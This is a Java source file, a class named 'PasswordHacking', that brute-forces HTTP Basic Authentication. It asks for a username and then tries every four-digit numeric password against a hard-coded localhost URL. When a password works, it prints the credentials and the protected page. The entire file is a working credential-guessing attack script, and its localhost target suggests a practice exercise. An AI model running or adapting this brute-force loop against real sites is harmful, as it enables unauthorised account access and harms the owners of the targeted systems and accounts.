import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.*;
import org.apache.commons.codec.binary.Base64;

/**
 * Created by tigorini on 18/10/17.
 */
public class PasswordHacking {

    public static void main(String[] args) throws IOException {
        String siteURL = "http://localhost/AAA";
        System.out.print("Enter username: ");
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        String uname = reader.readLine();
        String password;
        String authStr = "";
        InputStreamReader isr = null;

        System.out.println("Hacking password, wait...");
        boolean f = false;

        for (int x1 = 0; x1 < 10; x1++) {
            for (int x2 = 0; x2 < 10; x2++) {
                for (int x3 = 0; x3 < 10; x3++) {
                    for (int x4 = 0; x4 < 10; x4++) {
                        password = Integer.toString(x1) + Integer.toString(x2) +
                                Integer.toString(x3) + Integer.toString(x4);
                        authStr = uname + ":" + password;
                        byte[] authEncBytes = Base64.encodeBase64(authStr.getBytes());
                        String authStrEnc = new String(authEncBytes);

                        URLConnection connection = new URL(siteURL).openConnection();
                        connection.setRequestProperty("Authorization", "Basic " + authStrEnc);
                        try {
                            InputStream is = connection.getInputStream();
                            isr = new InputStreamReader(is);
                            f = true;
                            break;
                        } catch (IOException ignored) {}
                    }
                    if (f) break;
                }
                if (f) break;
            }
            if (f) break;
        }

        if (isr != null) {
            System.out.println("Auth data: " + authStr);
            int numCharsRead;
            char[] charArray = new char[1024];
            StringBuilder sb = new StringBuilder();
            while ((numCharsRead = isr.read(charArray)) > 0)
                sb.append(charArray, 0, numCharsRead);
            String result = sb.toString();
            isr.close();

            System.out.println("\n***BEGIN***");
            System.out.println(result);
            System.out.println("***END***");
        } else {
            System.out.println("Password not hacked");
        }
    }


}
